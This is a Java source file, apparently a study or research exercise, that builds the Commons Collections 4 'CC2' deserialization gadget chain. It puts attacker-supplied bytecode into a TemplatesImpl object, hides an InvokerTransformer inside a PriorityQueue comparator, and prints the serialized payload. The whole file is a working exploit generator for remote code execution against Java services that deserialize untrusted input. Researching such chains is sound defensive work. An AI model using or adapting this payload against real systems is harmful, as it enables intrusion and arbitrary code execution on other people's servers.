package com.example.cc2;

import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;

public class Main {
    public static void main(String[] args) throws Exception{

        byte[] code = Utils.GenerateEvil();
        TemplatesImpl obj = new TemplatesImpl();
        Utils.SetValue(obj, "_name","0w0");
        Utils.SetValue(obj, "_bytecodes", new byte[][]{code});
        Utils.SetValue(obj, "_tfactory", new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

        TransformingComparator fakeTransformer = new TransformingComparator<>(new ConstantTransformer<>(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(fakeTransformer);
        priorityQueue.add(obj);
        priorityQueue.add(obj);

        Utils.SetValue(fakeTransformer, "transformer", invokerTransformer);

        String barr = Utils.Serialize(priorityQueue);
        System.out.println(barr);
//        Utils.UnSerialize(barr);
    }
}
